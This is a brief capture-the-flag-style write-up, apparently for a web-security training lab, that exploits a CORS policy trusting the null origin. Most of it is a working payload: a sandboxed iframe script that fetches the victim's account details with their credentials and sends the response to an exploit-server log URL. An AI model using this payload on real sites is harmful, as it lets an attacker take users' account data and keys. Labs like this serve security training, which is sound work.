# Change the origin header to null value

![image](https://github.com/user-attachments/assets/3da97414-460a-4c9b-912a-35379d808a32)


# Send the malicious javascript code to administrator
```
<iframe sandbox="allow-scripts" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0aef00f9030f5c4681b59dde003400d1.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0a4200a403c25ccf815f9c7101f70056.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
# Check in access log
